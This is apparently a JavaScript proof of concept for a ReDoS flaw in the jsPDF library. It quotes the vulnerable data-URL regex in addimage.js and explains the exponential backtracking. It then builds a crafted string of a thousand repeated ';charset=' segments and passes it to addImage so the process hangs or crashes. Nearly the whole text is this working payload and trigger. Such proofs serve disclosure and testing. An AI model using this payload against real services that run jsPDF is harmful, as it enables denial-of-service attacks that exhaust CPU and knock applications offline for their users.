  const jsPDF = require('jspdf');
  const pdf = new jsPDF();

  // The vulnerable regex in src/modules/addimage.js is:
  // /^data:(\w*\/\w*);*(charset=[\w=-]*)*;*/
  // By repeating `;charset=` we create structural ambiguity between the standalone `;*`
  // and the `(charset=...)*` capturing group. When matching inevitably fails at 
  // the trailing 'x', the regex engine exponentially backtracks across all possible
  // partitioning of semicolons to satisfy the pattern, overwhelming CPU limits.
  const maliciousDataUrl = 'data:image/jpeg;charset=' + ';charset='.repeat(1000) + 'x';

  // Invoking addImage triggers the internal data-URL parser, which executes 
  // the vulnerable regex unconditionally. The process will hang or crash due to 
  // exponential backtracking before completing.
  pdf.addImage(maliciousDataUrl, 'JPEG');
